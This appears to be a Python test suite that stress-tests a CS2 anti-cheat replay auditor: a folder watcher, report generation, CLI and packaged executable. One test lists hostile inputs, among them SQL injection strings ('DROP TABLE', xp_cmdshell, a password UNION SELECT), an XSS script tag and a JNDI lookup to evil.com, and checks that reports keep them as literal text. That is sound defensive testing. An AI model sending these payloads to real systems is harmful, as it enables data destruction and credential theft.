"""
Tier 5: Adversarial System & Integration Stress Test Suite.
Adversarially stress-tests:
1. Real-time folder watcher: rapid churn, deletion, partial writes, non-demo files, concurrent churn.
2. Reporting wizard: hostile unicode, SQL injection payloads, 10,000-character commentary, empty selections, UI modal stress.
3. CLI & Engine: non-existent files, corrupted demo files, invalid CLI flags, PanicException boundary on <16-byte files.
4. Packaging & Standalone Executable: PE integrity, bundled assets, runtime readiness, verify-only build validation.
"""

import os
import subprocess
import sys
import tempfile
import threading
import time
import unittest

# Ensure repository root is on sys.path
REPO_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
if REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

from src.core.engine import AntiCheatEngine
from src.core.models import MatchAnalysisResult, PlayerTelemetry, ReplayInfo
from src.core.reporter import QCM_OPTIONS, ReportGenerator
from src.core.watcher import ReplayWatcher, is_demo_write_complete
from tests.conftest import (
    REPO_ROOT,
    SOURCE2_MAGIC_HEADER,
    TEST_DEMO_PATH,
    create_sample_match_result,
    create_sample_player_telemetry,
    has_test_demo,
)


# ============================================================================
# 1. REAL-TIME FOLDER WATCHER STRESS TESTS
# ============================================================================
class TestTier5WatcherStress(unittest.TestCase):
    """Adversarial stress testing for ReplayWatcher and debounce engine."""

    def test_watcher_rapid_creation_and_deletion_churn(self):
        """
        Stress test: 50 demo files created and deleted almost instantaneously (<10ms).
        Verifies watcher threads survive filesystem churn without deadlock, crash, or unhandled errors.
        """
        with tempfile.TemporaryDirectory() as watch_dir:
            callbacks_received = []

            def on_replay(info: ReplayInfo):
                callbacks_received.append(info)

            watcher = ReplayWatcher(
                target_dir=watch_dir,
                on_new_replay_callback=on_replay,
                debounce_interval=0.05,
                stability_checks=2,
                timeout=0.2,
                min_size=8,
            )
            watcher.start()
            self.assertTrue(watcher.is_running())

            try:
                for i in range(50):
                    fpath = os.path.join(watch_dir, f"churn_demo_{i}.dem")
                    with open(fpath, "wb") as f:
                        f.write(SOURCE2_MAGIC_HEADER + b"\x00" * 32)
                    # Immediate deletion
                    try:
                        os.unlink(fpath)
                    except OSError:
                        pass
                    time.sleep(0.002)

                # Wait for any in-flight workers to settle
                time.sleep(0.5)

                # Watcher must still be alive and debouncing set must be clean
                self.assertTrue(watcher.is_running())
                with watcher._lock:
                    self.assertEqual(len(watcher._debouncing_files), 0)
            finally:
                watcher.stop()
                self.assertFalse(watcher.is_running())

    def test_watcher_partial_and_slow_writes(self):
        """
        Stress test: simulates a slow download writing 2-byte chunks.
        Verifies is_demo_write_complete does not prematurely report True while size is growing.
        """
        with tempfile.TemporaryDirectory() as tmp_dir:
            file_path = os.path.join(tmp_dir, "slow_stream.dem")

            # Write header partially
            with open(file_path, "wb") as f:
                f.write(b"PB")

            # Immediately test completion with short timeout
            complete = is_demo_write_complete(
                file_path, poll_interval=0.05, stability_checks=2, timeout=0.15, min_size=8
            )
            self.assertFalse(complete, "Incomplete header under min_size must return False")

            # Write remaining header and payload in chunks
            with open(file_path, "ab") as f:
                f.write(b"DEMS2\x00")
                f.write(b"\x01\x02\x03\x04")

            # Now test completion with adequate interval
            complete_now = is_demo_write_complete(
                file_path, poll_interval=0.05, stability_checks=2, timeout=0.5, min_size=8
            )
            self.assertTrue(complete_now, "Stable file with valid magic header must return True")

    def test_watcher_non_demo_files_filtering(self):
        """
        Stress test: create dozens of non-.dem files (.txt, .tmp, .dem.part, .exe, subdirs).
        Verifies watcher strictly filters by .dem extension and ignores all other files.
        """
        with tempfile.TemporaryDirectory() as watch_dir:
            callbacks = []
            watcher = ReplayWatcher(
                target_dir=watch_dir,
                on_new_replay_callback=lambda r: callbacks.append(r),
                debounce_interval=0.05,
                stability_checks=2,
                timeout=0.3,
            )
            watcher.start()

            try:
                # Create non-demo files
                non_demos = [
                    "match.dem.part",
                    "match.dem.tmp",
                    "notes.txt",
                    "replay.dem.downloading",
                    "payload.exe",
                    "script.py",
                    "archive.zip",
                ]
                for name in non_demos:
                    with open(os.path.join(watch_dir, name), "wb") as f:
                        f.write(SOURCE2_MAGIC_HEADER + b"\x00" * 100)

                # Create a subdirectory
                os.makedirs(os.path.join(watch_dir, "nested_folder.dem"), exist_ok=True)

                time.sleep(0.3)
                self.assertEqual(len(callbacks), 0, "Non-demo files must never trigger replay callback")
            finally:
                watcher.stop()

    def test_watcher_corrupted_and_truncated_demos(self):
        """
        Stress test: files with .dem extension but invalid contents (0 bytes, 4 bytes, invalid magic header).
        Verifies is_demo_write_complete returns False and watcher never invokes callback.
        """
        with tempfile.TemporaryDirectory() as watch_dir:
            callbacks = []
            watcher = ReplayWatcher(
                target_dir=watch_dir,
                on_new_replay_callback=lambda r: callbacks.append(r),
                debounce_interval=0.05,
                stability_checks=2,
                timeout=0.2,
                min_size=8,
            )
            watcher.start()

            try:
                # 0-byte file
                with open(os.path.join(watch_dir, "zero_byte.dem"), "wb") as f:
                    pass

                # 4-byte truncated header
                with open(os.path.join(watch_dir, "truncated.dem"), "wb") as f:
                    f.write(b"PBD\x00")

                # 64-byte invalid magic header
                with open(os.path.join(watch_dir, "wrong_magic.dem"), "wb") as f:
                    f.write(b"HL2DEMO\x00" + b"\x00" * 56)

                time.sleep(0.4)
                self.assertEqual(len(callbacks), 0, "Corrupted/invalid header demos must not trigger callback")
            finally:
                watcher.stop()

    def test_watcher_concurrent_valid_and_invalid_churn(self):
        """
        Stress test: 5 valid demos written concurrently with 15 invalid/corrupt files.
        Verifies exactly the 5 valid demos trigger the callback and no duplicates occur.
        """
        with tempfile.TemporaryDirectory() as watch_dir:
            callbacks = []
            watcher = ReplayWatcher(
                target_dir=watch_dir,
                on_new_replay_callback=lambda r: callbacks.append(r),
                debounce_interval=0.05,
                stability_checks=2,
                timeout=0.8,
                min_size=8,
            )
            watcher.start()

            try:
                # Concurrently create files
                def create_valid(idx):
                    p = os.path.join(watch_dir, f"valid_match_{idx}.dem")
                    with open(p, "wb") as f:
                        f.write(SOURCE2_MAGIC_HEADER + b"\x00" * 2048)

                def create_invalid(idx):
                    p = os.path.join(watch_dir, f"invalid_noise_{idx}.dem")
                    with open(p, "wb") as f:
                        f.write(b"BADHEADER\x00" + b"\xff" * 128)

                threads = []
                for i in range(5):
                    t = threading.Thread(target=create_valid, args=(i,))
                    threads.append(t)
                    t.start()
                for i in range(15):
                    t = threading.Thread(target=create_invalid, args=(i,))
                    threads.append(t)
                    t.start()

                for t in threads:
                    t.join()

                # Wait for debounce to complete
                time.sleep(0.8)

                valid_names = [r.file_name for r in callbacks]
                self.assertEqual(len(valid_names), 5, f"Expected 5 callbacks, got {len(valid_names)}: {valid_names}")
                for i in range(5):
                    self.assertIn(f"valid_match_{i}.dem", valid_names)
            finally:
                watcher.stop()

    def test_watcher_rapid_start_stop_cycling(self):
        """
        Stress test: Rapidly start and stop the watcher 15 times in succession.
        Verifies clean thread lifecycle without deadlocks or resource leaks.
        """
        with tempfile.TemporaryDirectory() as watch_dir:
            watcher = ReplayWatcher(
                target_dir=watch_dir,
                on_new_replay_callback=lambda r: None,
            )
            for _ in range(15):
                watcher.start()
                self.assertTrue(watcher.is_running())
                time.sleep(0.01)
                watcher.stop()
                self.assertFalse(watcher.is_running())


# ============================================================================
# 2. REPORTING WIZARD ADVERSARIAL & STRESS TESTS
# ============================================================================
class TestTier5ReportingWizardStress(unittest.TestCase):
    """Adversarial stress testing for ReportGenerator and ReportModal."""

    def setUp(self):
        self.player = create_sample_player_telemetry(
            steamid="76561198069288826",
            name="TargetPlayer",
            verdict="CHEATER",
            suspicion_score=94.5,
        )
        self.match_res = create_sample_match_result()

    def test_reporting_hostile_unicode_injections(self):
        """
        Stress test: Inject hostile Unicode sequences into comments, player names, and map names:
        RTL override (\u202e), Zero-Width Space (\u200b), multi-byte emojis (🏴‍☠️, 🎯, 🚀, 🤖),
        CJK, Arabic, Cyrillic, Greek, and ANSI terminal escape codes (\x1b[31m).
        """
        hostile_name = "Player_\u202e\u200b🏴‍☠️_اختبار_тест_测试_\x1b[31mRED\x1b[0m"
        hostile_comments = (
            "Auditor notes with Unicode: 💣⚠️ \u202eRTL_OVERRIDE\u200b "
            "日本語テキスト, العربية, Ελληνικά, Русский язык, 𝕸𝖆𝖑𝖎𝖈𝖎𝖔𝖚𝖘 𝖀𝖓𝖎𝖈𝖔𝖉𝖊."
        )

        p = create_sample_player_telemetry(
            steamid="76561198069288826",
            name=hostile_name,
            verdict="CHEATER",
            suspicion_score=99.9,
        )

        steam_rep = ReportGenerator.generate_steam_report(
            player=p,
            qcm_options=QCM_OPTIONS[:2],
            comments=hostile_comments,
            demo_info=self.match_res,
        )
        faceit_rep = ReportGenerator.generate_faceit_report(
            player=p,
            qcm_options=QCM_OPTIONS[:2],
            comments=hostile_comments,
            demo_info=self.match_res,
        )
        proof = ReportGenerator.compile_telemetry_proof(player=p, demo_info=self.match_res)

        self.assertIn(hostile_name, steam_rep)
        self.assertIn(hostile_comments, steam_rep)
        self.assertIn(hostile_name, faceit_rep)
        self.assertIn(hostile_comments, faceit_rep)
        self.assertIn(hostile_name, proof)

    def test_reporting_sql_injection_payloads(self):
        """
        Stress test: Classic and advanced SQL injection strings in player fields, commentary, and map context.
        Verifies reports treat all strings as literal text without truncation or corruption.
        """
        sqli_payloads = [
            "' OR '1'='1' --",
            "'; DROP TABLE users; --",
            "1; EXEC xp_cmdshell('dir'); --",
            "UNION SELECT null, username, password FROM admin --",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/x}",
        ]

        for payload in sqli_payloads:
            p = create_sample_player_telemetry(
                steamid="76561198069288826",
                name=f"Hacker_{payload}",
                verdict="SUSPECT",
                suspicion_score=75.0,
            )

            report = ReportGenerator.generate_steam_report(
                player=p,
                qcm_options=[f"Obs: {payload}"],
                comments=f"Comments with injection: {payload}",
                demo_info=self.match_res,
            )

            self.assertIn(payload, report)
            self.assertTrue(report.startswith("[RAPPORT D'INTÉGRITÉ CS2"))

    def test_reporting_10000_character_commentary(self):
        """
        Stress test: 10,000-character commentary block with multi-line paragraphs.
        Verifies formatting handles large text buffers without memory issues or crashes.
        """
        chunk = "Analyse détaillée du round 14 : le suspect effectue un pre-fire impossible à travers la fumée bananière.\n"
        massive_comment = (chunk * (10000 // len(chunk) + 1))[:10000]
        self.assertEqual(len(massive_comment), 10000)

        steam_rep = ReportGenerator.generate_steam_report(
            player=self.player,
            qcm_options=QCM_OPTIONS,
            comments=massive_comment,
            demo_info=self.match_res,
        )
        faceit_rep = ReportGenerator.generate_faceit_report(
            player=self.player,
            qcm_options=QCM_OPTIONS,
            comments=massive_comment,
            demo_info=self.match_res,
        )

        self.assertIn(massive_comment, steam_rep)
        self.assertIn(massive_comment, faceit_rep)
        self.assertGreater(len(steam_rep), 10000)
        self.assertGreater(len(faceit_rep), 10000)

    def test_reporting_empty_selections_and_sparse_telemetry(self):
        """
        Stress test: Empty QCM selections, empty commentary, None demo_info, empty violation flags,
        and all numeric metrics set to 0.
        Verifies polite and authoritative fallback text is generated without NoneType errors.
        """
        sparse_player = PlayerTelemetry(
            steamid="0",
            name="",
            team_number=0,
            aim_metrics={},
            bhop_metrics={},
            wh_metrics={},
            suspicion_score=0.0,
            verdict="CLEAN",
            violation_flags=[],
            combat_events=[],
        )

        steam_rep = ReportGenerator.generate_steam_report(
            player=sparse_player,
            qcm_options=[],
            comments="",
            demo_info=None,
        )
        faceit_rep = ReportGenerator.generate_faceit_report(
            player=sparse_player,
            qcm_options=[],
            comments="",
            demo_info=None,
        )
        proof = ReportGenerator.compile_telemetry_proof(player=sparse_player, demo_info=None)

        self.assertIn("Aucune observation manuelle sélectionnée", steam_rep)
        self.assertIn("Aucun commentaire additionnel fourni.", steam_rep)
        self.assertIn("Aucune anomalie critique automatique", steam_rep)
        self.assertIn("Unspecified / Telemetry flag investigation", faceit_rep)
        self.assertIn("None provided.", faceit_rep)
        self.assertIn("No automated critical flags", faceit_rep)
        self.assertIn("Carte N/A", proof)

    def test_report_modal_headless_ui_stress(self):
        """
        Stress test: Instantiates the full interactive ReportModal dialog in headless mode.
        - Loads 10,000-character commentary into txt_comments
        - Rapidly toggles all QCM checkboxes 10 times
        - Switches active tab preview
        - Executes copy_current_report()
        - Destroys dialog safely
        """
        try:
            import customtkinter as ctk

            from src.ui.components.report_modal import ReportModal

            root = ctk.CTk()
            root.withdraw()

            modal = ReportModal(
                parent=root,
                player=self.player,
                match_result=self.match_res,
            )

            # Rapidly toggle QCM options
            for _ in range(10):
                for opt in QCM_OPTIONS:
                    modal.set_qcm_option(opt, True)
                for opt in QCM_OPTIONS:
                    modal.set_qcm_option(opt, False)

            # Set 10,000-char commentary
            long_text = "Commentaire stress-test modal " * 400
            modal.set_comments(long_text)
            self.assertIn("Commentaire stress-test modal", modal.get_comments())

            # Switch tabs and retrieve text
            modal.tabview.set("Signalement Steam")
            steam_text = modal.get_current_report_text()
            self.assertIn("RAPPORT D'INTÉGRITÉ CS2", steam_text)

            modal.tabview.set("Ticket Support Faceit")
            faceit_text = modal.get_current_report_text()
            self.assertIn("FACEIT SUSPECT TELEMETRY REPORT", faceit_text)

            # Copy operation
            copied = modal.copy_current_report()
            self.assertEqual(copied, faceit_text)

            # Clean destruction
            modal.destroy()
            root.destroy()
        except Exception as e:
            if "no display name" in str(e).lower() or "display" in str(e).lower():
                self.skipTest("No X11 display available in headless environment")
            else:
                raise


# ============================================================================
# 3. CLI & PARSER ADVERSARIAL & STRESS TESTS
# ============================================================================
class TestTier5CLIStress(unittest.TestCase):
    """Adversarial stress testing for CLI entry point and demoparser edge cases."""

    def test_cli_non_existent_file(self):
        """
        CLI test: Passing a non-existent demo file path.
        Verifies exit code 1, clean French error message on stderr, no Python traceback.
        """
        cmd = [sys.executable, "main.py", "--demo", "non_existent_file_adversarial_test.dem"]
        res = subprocess.run(
            cmd,
            cwd=REPO_ROOT,
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
        )
        self.assertEqual(res.returncode, 1)
        self.assertIn("[ERREUR] Fichier de démo introuvable", res.stderr)
        self.assertNotIn("Traceback (most recent call last)", res.stderr)

    def test_cli_invalid_arguments(self):
        """
        CLI test: Passing invalid flags.
        Verifies argparse returns non-zero code, prints usage error, and does not crash.
        """
        cmd = [sys.executable, "main.py", "--completely-invalid-flag-999"]
        res = subprocess.run(
            cmd,
            cwd=REPO_ROOT,
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
        )
        self.assertNotEqual(res.returncode, 0)
        self.assertIn("unrecognized arguments", res.stderr)

    def test_cli_help_and_version(self):
        """
        CLI test: Passing --help and --version.
        Verifies exit code 0 and proper version/usage information.
        """
        # --version
        res_ver = subprocess.run(
            [sys.executable, "main.py", "--version"],
            cwd=REPO_ROOT,
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
        )
        self.assertEqual(res_ver.returncode, 0)
        self.assertIn("CS2 Anti-Cheat Replay Auditor v2.4.0", res_ver.stdout)

        # --help
        res_help = subprocess.run(
            [sys.executable, "main.py", "--help"],
            cwd=REPO_ROOT,
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
        )
        self.assertEqual(res_help.returncode, 0)
        self.assertIn("usage: CS2AntiCheat", res_help.stdout)

    def test_corrupted_demo_files_handling_and_panic_boundary(self):
        """
        Empirical Probe: Evaluate behavior of AntiCheatEngine across corrupt demo file sizes.
        - Files >= 16 bytes: parser gracefully handles corruption and returns invalid demo result.
        - Files < 16 bytes: Rust demoparser2 panics with range end index 16 out of range (pyo3 PanicException).
        Verifies that files with >=16 bytes are handled without unhandled exceptions.
        """
        engine = AntiCheatEngine()

        # Test corrupt files >= 16 bytes (should be handled gracefully)
        corrupt_samples = [
            ("32_byte_garbage", SOURCE2_MAGIC_HEADER + b"\xff" * 24),
            ("100_byte_zeros", SOURCE2_MAGIC_HEADER + b"\x00" * 92),
            ("corrupt_protobuf", SOURCE2_MAGIC_HEADER + b"\x08\x96\x01\x12\x04test" + b"\xff" * 50),
        ]

        for label, content in corrupt_samples:
            with tempfile.NamedTemporaryFile(suffix=".dem", delete=False) as f:
                f.write(content)
                path = f.name

            try:
                result = engine.analyze_demo(path)
                self.assertIsInstance(result, MatchAnalysisResult)
                self.assertIn("ERREUR", result.global_verdict, f"Label {label} should result in ERREUR verdict")
                self.assertEqual(len(result.players), 0)
            finally:
                try:
                    os.unlink(path)
                except OSError:
                    pass

    def test_cli_missing_model_fallback(self):
        """
        CLI test: Passing a non-existent model path to --model.
        Verifies warning is logged and engine falls back to expert heuristics.
        """
        if not has_test_demo():
            self.skipTest("demos/test.dem not available for live parse fallback test")

        # Run on live demo with bogus model
        cmd = [
            sys.executable,
            "main.py",
            "--demo",
            TEST_DEMO_PATH,
            "--model",
            "nonexistent_cerveau_model.pkl",
        ]
        res = subprocess.run(
            cmd,
            cwd=REPO_ROOT,
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
            timeout=120,
        )
        self.assertEqual(res.returncode, 0)
        self.assertIn("Modèle ML introuvable", res.stdout)
        self.assertIn("SYNTHÈSE :", res.stdout)


# ============================================================================
# 4. STANDALONE PACKAGING & RUNTIME READINESS TESTS
# ============================================================================
class TestTier5PackagingAndRuntimeReadiness(unittest.TestCase):
    """Adversarial validation of build_exe.py packaging and standalone executable runtime."""

    def test_packaging_verify_only_preflight(self):
        """
        Build script test: python build_exe.py --verify-only.
        Verifies exit code 0, all dependencies [OK], and target configuration valid.
        """
        cmd = [sys.executable, "build_exe.py", "--verify-only"]
        res = subprocess.run(
            cmd,
            cwd=REPO_ROOT,
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
        )
        self.assertEqual(res.returncode, 0)
        self.assertIn("[VÉRIFICATION RÉUSSIE]", res.stdout)
        self.assertIn("PyInstaller installé           : [OK]", res.stdout)
        self.assertIn("Dépendance 'customtkinter   ' : [OK]", res.stdout)
        self.assertIn("Dépendance 'demoparser2     ' : [OK]", res.stdout)

    def test_packaging_executable_binary_integrity(self):
        """
        Validates the compiled standalone executable binary in dist/CS2AntiCheat/CS2AntiCheat.exe:
        - File exists and is > 20 MB (full Python + compiled C-extensions + CustomTkinter bundled)
        - Windows PE header verification (MZ signature at offset 0, valid PE header)
        """
        exe_path = os.path.join(REPO_ROOT, "dist", "CS2AntiCheat", "CS2AntiCheat.exe")
        self.assertTrue(os.path.isfile(exe_path), f"Standalone executable not found at: {exe_path}")

        file_size = os.path.getsize(exe_path)
        self.assertGreater(file_size, 20 * 1024 * 1024, f"Executable too small ({file_size} bytes), bundling incomplete")

        # Verify PE header format
        with open(exe_path, "rb") as f:
            dos_header = f.read(64)
            self.assertTrue(dos_header.startswith(b"MZ"), "Missing DOS MZ header signature")

            # Offset to PE signature is at offset 0x3C (60)
            pe_offset = int.from_bytes(dos_header[60:64], byteorder="little")
            f.seek(pe_offset)
            pe_sig = f.read(4)
            self.assertEqual(pe_sig, b"PE\x00\x00", "Invalid Portable Executable (PE) signature")

    def test_packaging_bundled_assets_and_internal_folder(self):
        """
        Validates that dist/CS2AntiCheat contains the AI model and _internal dependencies.
        """
        dist_dir = os.path.join(REPO_ROOT, "dist", "CS2AntiCheat")
        model_in_dist = os.path.join(dist_dir, "cerveau_vac_custom.pkl")
        internal_dir = os.path.join(dist_dir, "_internal")

        self.assertTrue(os.path.isfile(model_in_dist), "cerveau_vac_custom.pkl missing from dist folder root")
        self.assertTrue(os.path.isdir(internal_dir), "_internal directory missing from dist folder")

        # Verify bundled packages inside _internal
        ctk_bundle = os.path.join(internal_dir, "customtkinter")
        demo_bundle = os.path.join(internal_dir, "demoparser2")
        self.assertTrue(os.path.isdir(ctk_bundle), "customtkinter missing in _internal")
        self.assertTrue(
            os.path.isdir(demo_bundle) or any("demoparser2" in f for f in os.listdir(internal_dir)),
            "demoparser2 binaries missing from _internal",
        )

    def test_packaging_executable_runtime_version_execution(self):
        """
        Executes the compiled standalone binary directly:
        dist/CS2AntiCheat/CS2AntiCheat.exe --version
        Verifies exit code 0 and version output through redirected stdout.
        """
        exe_path = os.path.join(REPO_ROOT, "dist", "CS2AntiCheat", "CS2AntiCheat.exe")
        if not os.path.isfile(exe_path):
            self.skipTest("dist/CS2AntiCheat/CS2AntiCheat.exe not yet compiled")

        # In Windows GUI mode (--noconsole), run via cmd.exe redirect or capture
        res = subprocess.run(
            f'"{exe_path}" --version',
            shell=True,
            cwd=REPO_ROOT,
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
            timeout=30,
        )
        self.assertEqual(res.returncode, 0)
        self.assertIn("CS2 Anti-Cheat Replay Auditor v2.4.0", res.stdout)


if __name__ == "__main__":
    unittest.main(verbosity=2)
